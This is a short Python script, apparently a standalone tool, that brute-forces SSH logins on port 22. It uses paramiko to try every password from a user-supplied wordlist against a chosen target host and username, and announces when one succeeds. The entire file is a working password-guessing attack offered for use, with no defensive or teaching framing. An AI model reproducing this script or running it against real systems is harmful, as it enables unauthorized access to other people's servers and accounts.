import paramiko
import sys
import os
import socket
import termcolor

def ssh_connect(host, port, username, password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

host = input("Target: ")
user = input("User: ")
input_file = input("Password file: ")

if not os.path.exists(input_file):
    print("File/Path doesn't exist.")
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            res = ssh_connect(host, port=22, username=user, password=password)
            if res == 0:
                print(termcolor.colored("Found password", "green"))
                break
            elif res == 1:
                print("Could not find")
            elif res == 2:
                print("Error")
                sys.exit(1)
        except Exception as e:
            print("Error:", e)
            sys.exit(1)
